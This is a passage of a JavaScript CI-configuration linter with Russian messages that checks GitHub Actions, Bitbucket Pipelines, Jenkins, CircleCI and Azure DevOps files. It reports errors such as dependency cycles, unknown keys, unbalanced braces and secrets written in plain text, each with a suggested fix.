    else if (scriptJob.lines.length) for (const ln of scriptJob.lines) for (const [re, what] of SECRET_VALUE) if (re.test(ln.text)) add({ id: 'secret-in-script', severity: 'error', title: `В шаге задания ${q(id)} открытым текстом ${what}`, when: 'Уже сейчас — файл в истории Git', how: 'Ключ увидят все, у кого есть доступ к репозиторию.', why: 'Секреты нужно хранить в Settings → Secrets.', fix: 'Отзовите ключ и используйте ${{ secrets.ИМЯ }}.', file, line: ln.line, job: id });
  }

  // Циклы needs
  const reported = new Set();
  for (const start of jobIds) {
    const stack = [];
    const dfs = (n) => {
      if (stack.includes(n)) return [...stack.slice(stack.indexOf(n)), n];
      stack.push(n);
      for (const d of graph.get(n) ?? []) {
        if (!graph.has(d)) continue;
        const c = dfs(d);
        if (c) return c;
      }
      stack.pop();
      return null;
    };
    const c = dfs(start);
    if (c && !reported.has([...new Set(c)].sort().join())) {
      reported.add([...new Set(c)].sort().join());
      issue(['jobs', c[0], 'needs'], { id: 'gh-needs-cycle', severity: 'error', title: `Задания ждут друг друга по кругу: ${c.join(' → ')}`, how: ghRejected(`Job '${c[0]}' depends on job '${c[1]}' which creates a cycle in the dependency graph.`), why: 'Ни одно из заданий не может начаться первым.', fix: 'Уберите одну из зависимостей.', job: c[0] });
    }
  }

  function checkIf(cond, kp, jobId, jobLevel = false) {
    const s = String(cond);
    if (/\bsecrets\./.test(s)) issue(kp, { id: 'gh-if-secrets', severity: 'error', title: `${q(jobId)}: secrets в условии if`, how: ghRejected("Unrecognized named-value: 'secrets'"), why: 'Контекст secrets недоступен в if (чтобы условие не раскрывало секрет).', fix: 'Перенесите секрет в env и проверяйте env.MY_SECRET != \'\'' + (jobLevel ? ' на уровне шага' : '') + '.', job: jobId });
    const m = /^\s*\$\{\{([\s\S]*?)\}\}\s*(\S[\s\S]*)$/.exec(s);
    if (m && !/^\s*$/.test(m[2])) issue(kp, { id: 'gh-if-always-true', severity: 'warning', title: `${q(jobId)}: условие ${q(s)} всегда истинно`, when: `При каждом запуске`, how: 'Шаг/задание выполнится всегда: после ${{ … }} идёт текст, и всё выражение становится непустой строкой.', why: 'Если ${{ }} занимает не всё условие, GitHub подставляет результат в строку, а непустая строка — истина.', fix: `Уберите \${{ }} или оберните им всё условие: if: \${{ ${m[1].trim()} ${m[2]} }}`, job: jobId });
  }
}

/* =================== Bitbucket Pipelines =================== */

const BB_STEP = ['name', 'script', 'image', 'caches', 'services', 'artifacts', 'after-script', 'size', 'max-time', 'trigger', 'deployment', 'condition', 'oidc', 'clone', 'runs-on', 'fail-fast', 'runtime', 'output-variables'];
const BB_CACHES = ['docker', 'composer', 'dotnetcore', 'gradle', 'ivy2', 'maven', 'node', 'pip', 'sbt'];
const BB_SIZES = ['1x', '2x', '4x', '8x', '16x', '32x'];
const BB_WHEN = 'Сразу при push — Bitbucket проверяет bitbucket-pipelines.yml до запуска';
const bbRejected = (msg) => `Bitbucket не запустит пайплайн: «Configuration error: ${msg}».`;

function checkBitbucket(result, { pos, repo, add }) {
  const file = result.files[0]?.path;
  const d = pos.doc(file);
  if (!d) return;
  let data;
  try {
    data = d.doc.toJS({ maxAliasCount: 1000 }) ?? {};
  } catch {
    return;
  }
  const L = (kp) => pos.line(file, kp);
  const issue = (kp, o) => add({ when: BB_WHEN, file, line: L(kp), ...o });
  if (!isObj(data.pipelines)) return issue([], { id: 'bb-no-pipelines', severity: 'error', title: 'Нет раздела pipelines', how: bbRejected('There is an error in your bitbucket-pipelines.yml: missing section "pipelines"'), why: 'Без pipelines Bitbucket не знает, что запускать.', fix: 'pipelines:\n  default:\n    - step:\n        script:\n          - echo ok' });
  const defs = isObj(data.definitions) ? data.definitions : {};
  const definedCaches = new Set(Object.keys(isObj(defs.caches) ? defs.caches : {}));
  const definedServices = new Set(Object.keys(isObj(defs.services) ? defs.services : {}));
  const globalDocker = data.options?.docker === true;
  const globalMax = data.options?.['max-time'];
  if (globalMax !== undefined && Number(globalMax) > 120) issue(['options', 'max-time'], { id: 'bb-max-time', severity: 'error', title: `options: max-time ${globalMax} — больше 120 минут`, how: bbRejected('max-time must be between 1 and 120'), why: 'Шаг в Bitbucket Cloud ограничен 120 минутами.', fix: 'max-time: 120' });
  for (const k of Object.keys(data.pipelines)) {
    if (!['default', 'branches', 'tags', 'bookmarks', 'pull-requests', 'custom'].includes(k)) issue(['pipelines', k], { id: 'bb-pipelines-key', severity: 'error', title: `pipelines: неизвестный раздел ${q(k)}`, how: bbRejected(`Unexpected property "${k}"`), why: `Допустимы default, branches, tags, bookmarks, pull-requests, custom.${didYouMean(k, ['default', 'branches', 'tags', 'pull-requests', 'custom'])}`, fix: 'Исправьте имя раздела.' });
  }
  const groups = [];
  if (data.pipelines.default !== undefined) groups.push({ title: 'default', list: data.pipelines.default, kp: ['pipelines', 'default'] });
  for (const g of ['branches', 'tags', 'bookmarks', 'pull-requests', 'custom']) if (isObj(data.pipelines[g])) for (const [p, list] of Object.entries(data.pipelines[g])) groups.push({ title: `${g}: ${p}`, list, kp: ['pipelines', g, p] });
  const scriptJobs = [];
  let n = 0;
  for (const g of groups) {
    const deployments = new Map();
    const steps = [];
    const visit = (item, kp, inParallel) => {
      if (isObj(item?.parallel)) item = { parallel: item.parallel.steps ?? item.parallel };
      if (Array.isArray(item?.parallel)) {
        if (item.parallel.length < 2) issue(kp, { id: 'bb-parallel-one', severity: 'warning', title: `${g.title}: parallel с одним шагом`, how: 'Ошибки не будет, но параллельности тоже.', why: 'В parallel нужно минимум два шага.', fix: 'Уберите parallel или добавьте шаги.' });
        item.parallel.forEach((s, i) => visit(s, [...kp, 'parallel', i], true));
        return;
      }
      if (isObj(item?.stage)) {
        arr(item.stage.steps).forEach((s, i) => visit(s, [...kp, 'stage', 'steps', i], false));
        return;
      }
      const step = isObj(item?.step) ? item.step : null;
      if (!step) return issue(kp, { id: 'bb-not-step', severity: 'error', title: `${g.title}: элемент без step`, how: bbRejected('Each item in the pipeline must be a step, parallel or stage'), why: 'Элемент пайплайна — step, parallel или stage.', fix: '- step:\n    script:\n      - echo ok' });
      const skp = [...kp, 'step'];
      const label = step.name ? q(step.name) : `шаг ${steps.length + 1}`;
      steps.push({ step, kp: skp, inParallel });
      for (const k of Object.keys(step)) if (!BB_STEP.includes(k)) issue([...skp, k], { id: 'bb-step-key', severity: 'error', title: `${g.title}: ${label} — неизвестный ключ ${q(k)}`, how: bbRejected(`Unexpected property "${k}"`), why: `Допустимы: ${BB_STEP.join(', ')}.${didYouMean(k, BB_STEP)}`, fix: 'Исправьте ключ.' });
      if (step.script === undefined) issue(skp, { id: 'bb-no-script', severity: 'error', title: `${g.title}: ${label} — нет script`, how: bbRejected('Missing required property "script"'), why: 'Шагу нечего выполнять.', fix: 'script:\n  - echo ok' });
      else if (!arr(step.script).length) issue([...skp, 'script'], { id: 'bb-script-empty', severity: 'error', title: `${g.title}: ${label} — пустой script`, how: bbRejected('"script" must not be empty'), why: 'Нужна хотя бы одна команда.', fix: 'Добавьте команду.' });
      if (step['max-time'] !== undefined && (Number(step['max-time']) > 120 || Number(step['max-time']) < 1)) issue([...skp, 'max-time'], { id: 'bb-max-time', severity: 'error', title: `${g.title}: ${label} — max-time ${step['max-time']}`, how: bbRejected('max-time must be between 1 and 120'), why: 'Допустимо от 1 до 120 минут.', fix: 'max-time: 60' });
      if (step.size !== undefined && !BB_SIZES.includes(String(step.size))) issue([...skp, 'size'], { id: 'bb-size', severity: 'error', title: `${g.title}: ${label} — size ${step.size}`, how: bbRejected(`"${step.size}" is not a valid size`), why: `Допустимы: ${BB_SIZES.join(', ')}.`, fix: 'size: 2x' });
      if (step.trigger !== undefined && !['manual', 'automatic'].includes(step.trigger)) issue([...skp, 'trigger'], { id: 'bb-trigger', severity: 'error', title: `${g.title}: ${label} — trigger ${step.trigger}`, how: bbRejected('trigger must be "manual" or "automatic"'), why: 'Допустимы manual и automatic.', fix: 'trigger: manual' });
      for (const c of arr(step.caches)) if (!BB_CACHES.includes(String(c)) && !definedCaches.has(String(c))) issue([...skp, 'caches'], { id: 'bb-cache-undefined', severity: 'error', title: `${g.title}: ${label} — неизвестный кэш ${q(c)}`, how: bbRejected(`Cache "${c}" is not defined`), why: `Встроенные кэши: ${BB_CACHES.join(', ')}; свои нужно описать в definitions.caches.${didYouMean(c, [...BB_CACHES, ...definedCaches])}`, fix: `definitions:\n  caches:\n    ${c}: путь/к/папке` });
      for (const s of arr(step.services)) if (String(s) !== 'docker' && !definedServices.has(String(s))) issue([...skp, 'services'], { id: 'bb-service-undefined', severity: 'error', title: `${g.title}: ${label} — сервис ${q(s)} не описан`, how: bbRejected(`Service "${s}" is not defined`), why: 'Сервисы (кроме docker) описываются в definitions.services.', fix: `definitions:\n  services:\n    ${s}:\n      image: ${s}` });
      if (step.deployment !== undefined) {
        const env = String(step.deployment);
        if (deployments.has(env)) issue([...skp, 'deployment'], { id: 'bb-deployment-twice', severity: 'error', title: `${g.title}: окружение ${q(env)} используется дважды`, how: bbRejected(`The deployment environment "${env}" in your bitbucket-pipelines.yml file occurs multiple times in the pipeline`), why: 'В одном пайплайне каждое окружение развёртывается одним шагом.', fix: 'Используйте разные окружения или объедините шаги.' });
        deployments.set(env, true);
      }
      const scriptText = arr(step.script).map((x) => (typeof x === 'string' ? x : isObj(x) && x.pipe ? '' : JSON.stringify(x)));
      const usesDocker = scriptText.some((t) => /(^|\s|&&)docker\s+(build|push|run|login|compose|tag|pull)/.test(t));
      if (usesDocker && !arr(step.services).includes('docker') && !globalDocker) issue([...skp, 'script'], { id: 'bb-docker-service', severity: 'error', title: `${g.title}: ${label} — docker без services: [docker]`, when: `При выполнении шага ${label}`, how: 'Шаг упадёт: «Cannot connect to the Docker daemon at unix:///var/run/docker.sock» (или «docker: command not found»).', why: 'Docker в Bitbucket Pipelines доступен только как сервис.', fix: 'services:\n  - docker' });
      n += 1;
      scriptJobs.push({ name: step.name ? String(step.name) : `шаг ${n}`, file, line: L(skp), lines: arr(step.script).map((x, i) => ({ text: typeof x === 'string' ? x : '', line: L([...skp, 'script', i]) })), image: typeof (step.image ?? data.image) === 'string' ? step.image ?? data.image : (step.image ?? data.image)?.name, services: arr(step.services).map(String), vars: new Set(), artifactsFrom: steps.flatMap((s) => arr(isObj(s.step.artifacts) ? s.step.artifacts.paths : s.step.artifacts).map((p) => String(p).replace(/\/\*\*?$/, ''))), system: 'bitbucket', kind: 'шага' });
    };
    if (!Array.isArray(g.list)) {
      issue(g.kp, { id: 'bb-pipeline-not-list', severity: 'error', title: `${g.title}: должен быть список шагов`, how: bbRejected('A list of steps was expected'), why: 'Пайплайн — список «- step: …».', fix: '- step:\n    script:\n      - echo ok' });
      continue;
    }
    g.list.forEach((item, i) => visit(item, [...g.kp, i], false));
    const first = steps[0];
    if (first && first.step.trigger === 'manual' && !g.title.startsWith('custom')) issue([...first.kp, 'trigger'], { id: 'bb-first-manual', severity: 'error', title: `${g.title}: первый шаг не может быть ручным`, how: bbRejected('The first step of a pipeline can\'t be manual'), why: 'Пайплайн стартует автоматически, первый шаг тоже.', fix: 'Уберите trigger: manual у первого шага (или сделайте пайплайн custom).' });
  }
  checkScripts(scriptJobs, repo, add, { system: 'bitbucket' });
}

/* =================== Jenkins =================== */

const JENKINS_POST = ['always', 'changed', 'fixed', 'regression', 'aborted', 'failure', 'success', 'unstable', 'unsuccessful', 'cleanup'];
const J_WHEN = 'При запуске сборки — Jenkins сначала разбирает Jenkinsfile';
const jRejected = (msg) => `Сборка сразу упадёт с ошибкой разбора: «org.codehaus.groovy.control.MultipleCompilationErrorsException: startup failed: WorkflowScript: ${msg}».`;

function checkJenkins(result, { repo, add }) {
  const file = result.files[0]?.path;
  const text = result.files[0]?.text ?? '';
  const lineAt = (idx) => text.slice(0, idx).split('\n').length;
  const issue = (idx, o) => add({ when: J_WHEN, file, line: idx == null ? null : lineAt(idx), ...o });
  // Скобки (вне строк и комментариев)
  const stack = [];
  let quote = null;
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (quote) {
      if (c === '\\') i++;
      else if (text.startsWith(quote, i)) {
        i += quote.length - 1;
        quote = null;
      }
      continue;
    }
    if (text.startsWith('//', i)) {
      const e = text.indexOf('\n', i);
      i = e < 0 ? text.length : e;
      continue;
    }
    if (text.startsWith('/*', i)) {
      const e = text.indexOf('*/', i + 2);
      i = e < 0 ? text.length : e + 1;
      continue;
    }
    if (text.startsWith("'''", i) || text.startsWith('"""', i)) {
      quote = text.slice(i, i + 3);
      i += 2;
      continue;
    }
    if (c === '"' || c === "'") {
      quote = c;
      continue;
    }
    if ('{(['.includes(c)) stack.push({ c, i });
    else if ('})]'.includes(c)) {
      const open = stack.pop();
      const want = { '}': '{', ')': '(', ']': '[' }[c];
      if (!open || open.c !== want) {
        issue(i, { id: 'jenkins-brace', severity: 'error', title: `Лишняя «${c}» в строке ${lineAt(i)}`, how: jRejected(`${lineAt(i)}: unexpected token: ${c}`), why: open ? `Ожидалась закрывающая для «${open.c}» из строки ${lineAt(open.i)}.` : 'Для неё нет открывающей скобки.', fix: 'Проверьте парность скобок.' });
        stack.length = 0;
        break;
      }
    }
  }
  if (quote) issue(null, { id: 'jenkins-quote', severity: 'error', title: `Не закрыта строка ${quote}`, how: jRejected('unexpected end of file, expecting quote'), why: 'Где-то открыта кавычка без пары.', fix: 'Проверьте кавычки.' });
  else if (stack.length) issue(stack.at(-1).i, { id: 'jenkins-unclosed', severity: 'error', title: `Не закрыта «${stack.at(-1).c}» из строки ${lineAt(stack.at(-1).i)}`, how: jRejected(`${lineAt(text.length)}: expecting '}', found '' @ line ${lineAt(text.length)}`), why: 'Файл кончился раньше, чем закрылись все блоки.', fix: 'Добавьте недостающую скобку.' });

  const declarative = /^\s*pipeline\s*\{/m.test(text);
  if (declarative) {
    const pIdx = text.search(/^\s*pipeline\s*\{/m);
    const top = stripNested(blockAt(text, text.indexOf('{', pIdx)));
    if (!/(^|\n)\s*agent\b/.test(top)) issue(pIdx, { id: 'jenkins-no-agent', severity: 'error', title: 'В pipeline нет agent', how: jRejected('Missing required section "agent"'), why: 'Декларативный pipeline должен указать, где выполняться.', fix: 'pipeline {\n  agent any\n  …' });
    if (!/(^|\n)\s*stages\s*\{/.test(top)) issue(pIdx, { id: 'jenkins-no-stages', severity: 'error', title: 'В pipeline нет stages', how: jRejected('Missing required section "stages"'), why: 'Этапы обязательны.', fix: 'stages {\n  stage(\'Build\') {\n    steps { sh \'make\' }\n  }\n}' });
    const names = new Map();
    const re = /\bstage\s*\(\s*(['"])(.+?)\1\s*\)\s*\{/g;
    let m;
    while ((m = re.exec(text))) {
      const open = m.index + m[0].length - 1;
      const inner = blockAt(text, open);
      if (names.has(m[2])) issue(m.index, { id: 'jenkins-stage-dup', severity: 'error', title: `Этап ${q(m[2])} объявлен дважды`, how: jRejected(`Duplicate stage name: "${m[2]}"`), why: `Первый раз — в строке ${names.get(m[2])}.`, fix: 'Переименуйте один из этапов.' });
      names.set(m[2], lineAt(m.index));
      const kinds = ['steps', 'stages', 'parallel', 'matrix'].filter((k) => new RegExp(`(^|\\n)\\s*${k}\\s*\\{`).test(stripNested(inner)));
      if (kinds.length === 0) issue(m.index, { id: 'jenkins-stage-empty', severity: 'error', title: `Этап ${q(m[2])} без steps`, how: jRejected(`Stage "${m[2]}" must have one and only one of "steps", "stages", "parallel", or "matrix"`), why: 'Этапу нечего выполнять.', fix: "steps {\n  sh 'echo ok'\n}" });
      else if (kinds.length > 1) issue(m.index, { id: 'jenkins-stage-multi', severity: 'error', title: `Этап ${q(m[2])}: одновременно ${kinds.join(' и ')}`, how: jRejected(`Stage "${m[2]}" must have one and only one of "steps", "stages", "parallel", or "matrix"`), why: 'Можно что-то одно.', fix: 'Разнесите на вложенные этапы.' });
    }
    for (const pm of text.matchAll(/\bpost\s*\{/g)) {
      const inner = blockAt(text, pm.index + pm[0].length - 1);
      for (const c of inner.matchAll(/(?:^|\n)\s*([A-Za-z_]+)\s*\{/g)) {
        if (!JENKINS_POST.includes(c[1])) issue(pm.index, { id: 'jenkins-post', severity: 'error', title: `post: неизвестное условие ${q(c[1])}`, how: jRejected(`Invalid condition "${c[1]}" - valid conditions are [${JENKINS_POST.join(', ')}]`), why: `Неизвестное условие.${didYouMean(c[1], JENKINS_POST)}`, fix: 'Исправьте условие.' });
      }
    }
  } else if (!/\bnode\s*[({]/.test(text) && text.trim()) {
    issue(1, { id: 'jenkins-no-pipeline', severity: 'warning', title: 'Не найдено ни pipeline { }, ни node { }', how: 'Jenkins выполнит файл как Groovy-скрипт — скорее всего, ничего не соберётся.', why: 'Jenkinsfile начинается с pipeline { … } (декларативный) или node { … } (скриптовый).', fix: 'pipeline {\n  agent any\n  stages { … }\n}' });
  }
  for (const [re, what] of SECRET_VALUE) {
    const m = re.exec(text);
    if (m) issue(m.index, { id: 'secret-in-script', severity: 'error', title: `В Jenkinsfile открытым текстом ${what}`, how: 'Ключ увидят все, у кого есть доступ к репозиторию.', why: 'Секреты нужно хранить в Jenkins Credentials.', fix: "Отзовите ключ; используйте withCredentials([string(credentialsId: '…', variable: 'TOKEN')]) { … }", when: 'Уже сейчас — файл в истории Git' });
  }
  // Команды sh '...'
  const lines = [];
  for (const m of text.matchAll(/\b(sh|bat)\s*\(?\s*(?:script\s*:\s*)?('''|"""|'|")([\s\S]*?)\2/g)) {
    if (m[1] === 'bat') continue;
    const start = lineAt(m.index);
    m[3].split('\n').forEach((t, k) => lines.push({ text: m[2] === '"' || m[2] === '"""' ? t.replace(/\$\{[^}]*\}/g, '$X') : t, line: start + k }));
  }
  if (lines.length) checkScripts([{ name: 'Jenkinsfile', file, line: 1, lines, image: null, services: [], vars: new Set(), artifactsFrom: [], system: 'jenkins', where: 'Jenkinsfile', kind: 'сборки' }], repo, add, { system: 'jenkins' });
}
function blockAt(text, open) {
  let depth = 0;
  for (let i = open; i < text.length; i++) {
    if (text[i] === '{') depth++;
    else if (text[i] === '}' && --depth === 0) return text.slice(open + 1, i);
  }
  return text.slice(open + 1);
}
function stripNested(inner) {
  // Только верхний уровень блока этапа: вложенные { … } убираем
  let out = '';
  let depth = 0;
  for (const c of inner) {
    if (c === '{') {
      if (depth === 0) out += '{';
      depth++;
    } else if (c === '}') depth--;
    else if (depth === 0) out += c;
  }
  return out;
}

/* =================== CircleCI и Azure (основное) =================== */

function checkCircle(result, { pos, repo, add }) {
  const file = result.files[0]?.path;
  const d = pos.doc(file);
  if (!d) return;
  const data = d.doc.toJS() ?? {};
  const L = (kp) => pos.line(file, kp);
  const when = 'Сразу при push — CircleCI проверяет config.yml до запуска';
  if (data.version === undefined) add({ id: 'circle-no-version', severity: 'error', title: 'Не указан version', when, how: 'CircleCI не запустит сборку: «Config does not conform to schema: missing required property version».', why: 'Первая строка конфигурации — версия.', fix: 'version: 2.1', file, line: 1 });
  const jobs = isObj(data.jobs) ? data.jobs : {};
  const orbs = new Set(Object.keys(isObj(data.orbs) ? data.orbs : {}));
  for (const [wf, cfg] of Object.entries(isObj(data.workflows) ? data.workflows : {})) {
    if (!isObj(cfg)) continue;
    const names = arr(cfg.jobs).map((e) => (typeof e === 'string' ? e : Object.values(e ?? {})[0]?.name ?? Object.keys(e ?? {})[0]));
    arr(cfg.jobs).forEach((e, i) => {
      const ref = typeof e === 'string' ? e : Object.keys(e ?? {})[0];
      const opts = typeof e === 'string' ? {} : Object.values(e ?? {})[0] ?? {};
      if (ref && !jobs[ref] && !ref.includes('/') && opts?.type !== 'approval') add({ id: 'circle-job-unknown', severity: 'error', title: `${wf}: задание ${q(ref)} не описано`, when, how: `CircleCI не запустит workflow: «Job '${ref}' not found».`, why: `В jobs нет ${q(ref)}.${didYouMean(ref, Object.keys(jobs))}`, fix: 'Исправьте имя или опишите задание.', file, line: L(['workflows', wf, 'jobs', i]) });
      if (ref?.includes('/') && !orbs.has(ref.split('/')[0])) add({ id: 'circle-orb-unknown', severity: 'error', title: `${wf}: orb ${q(ref.split('/')[0])} не подключён`, when, how: `CircleCI не запустит workflow: «Cannot find a definition for job named ${ref}».`, why: 'Орб нужно объявить в разделе orbs.', fix: `orbs:\n  ${ref.split('/')[0]}: circleci/${ref.split('/')[0]}@x.y`, file, line: L(['workflows', wf, 'jobs', i]) });
      for (const r of arr(opts?.requires)) if (!names.includes(r)) add({ id: 'circle-requires-unknown', severity: 'error', title: `${wf}: ${q(ref)} ждёт ${q(r)}, которого нет в workflow`, when, how: `CircleCI не запустит workflow: «Job '${ref}' requires '${r}', which is the name of 0 other jobs in workflow '${wf}'».`, why: `В workflow ${q(wf)} нет задания ${q(r)}.${didYouMean(r, names)}`, fix: 'Исправьте имя.', file, line: L(['workflows', wf, 'jobs', i]) });
    });
  }
  for (const [name, job] of Object.entries(jobs)) {
    if (!isObj(job)) continue;
    if (!job.docker && !job.machine && !job.macos && !job.executor && !job.resource_class) add({ id: 'circle-no-executor', severity: 'error', title: `${q(name)}: не указан исполнитель`, when, how: `CircleCI не запустит задание: «Job '${name}' has no executor (docker, machine, macos or executor)».`, why: 'Заданию нужна среда выполнения.', fix: 'docker:\n  - image: cimg/base:stable', file, line: L(['jobs', name]) });
    if (!arr(job.steps).length) add({ id: 'circle-no-steps', severity: 'error', title: `${q(name)}: нет steps`, when, how: 'CircleCI не запустит задание: «steps is required».', why: 'Заданию нечего выполнять.', fix: 'steps:\n  - checkout\n  - run: echo ok', file, line: L(['jobs', name]) });
    const checkout = arr(job.steps).some((s) => s === 'checkout');
    const lines = arr(job.steps).flatMap((s, i) => {
      const run = isObj(s) ? s.run : null;
      const cmd = typeof run === 'string' ? run : run?.command;
      return cmd ? String(cmd).split('\n').map((t, k) => ({ text: t, line: (L(['jobs', name, 'steps', i]) ?? 0) + k || null })) : [];
    });
    if (checkout) checkScripts([{ name, file, line: L(['jobs', name]), lines, image: arr(job.docker)[0]?.image, services: [], vars: new Set(), artifactsFrom: [], system: 'circleci' }], repo, add, { system: 'circleci' });
    else if (lines.some((l) => /(^|\s)(\.\/|npm (ci|install)|make\b|mvn|gradle)/.test(l.text))) add({ id: 'circle-no-checkout', severity: 'warning', title: `${q(name)}: нет шага checkout`, when: `При выполнении задания ${q(name)}`, how: 'Команды упадут: файлов репозитория в контейнере нет.', why: 'Код появляется только после шага checkout.', fix: 'steps:\n  - checkout', file, line: L(['jobs', name, 'steps']) });
  }
}

function checkAzure(result, { pos, add }) {
  const file = result.files[0]?.path;
  const d = pos.doc(file);
  if (!d) return;
  const data = d.doc.toJS() ?? {};
  const L = (kp) => pos.line(file, kp);
  const when = 'Сразу при push — Azure DevOps проверяет файл до запуска';
  const jobs = Array.isArray(data.jobs) ? data.jobs : Array.isArray(data.stages) ? data.stages.flatMap((s) => arr(s?.jobs)) : [];
  const ids = jobs.map((j) => j?.job ?? j?.deployment).filter(Boolean);
  jobs.forEach((j, i) => {
    for (const dep of arr(j?.dependsOn)) if (!ids.includes(dep)) add({ id: 'azure-depends-unknown', severity: 'error', title: `${q(j.job ?? j.deployment)}: dependsOn на неизвестное ${q(dep)}`, when, how: `Azure не запустит пайплайн: «Job ${j.job ?? j.deployment} depends on unknown job ${dep}».`, why: `Задания ${q(dep)} нет.${didYouMean(dep, ids)}`, fix: 'Исправьте имя.', file, line: L(Array.isArray(data.jobs) ? ['jobs', i] : []) });
  });
  if (Array.isArray(data.stages)) {
    const sids = data.stages.map((s) => s?.stage).filter(Boolean);
    data.stages.forEach((s, i) => {
      for (const dep of arr(s?.dependsOn)) if (!sids.includes(dep)) add({ id: 'azure-stage-depends-unknown', severity: 'error', title: `Этап ${q(s.stage)}: dependsOn на неизвестный ${q(dep)}`, when, how: `Azure не запустит пайплайн: «Stage ${s.stage} depends on unknown stage ${dep}».`, why: `Этапа ${q(dep)} нет.${didYouMean(dep, sids)}`, fix: 'Исправьте имя.', file, line: L(['stages', i]) });
    });
  }
  if (!data.pool && !jobs.some((j) => j?.pool) && !Array.isArray(data.stages)) add({ id: 'azure-no-pool', severity: 'info', title: 'Не указан pool', when, how: 'Будет использован пул по умолчанию проекта — если в нём нет агентов, задание будет ждать бесконечно.', why: 'pool не задан ни в файле, ни в заданиях.', fix: 'pool:\n  vmImage: ubuntu-latest', file, line: 1 });
}

module.exports = { checkGithub, checkBitbucket, checkJenkins, checkCircle, checkAzure, cronProblem };
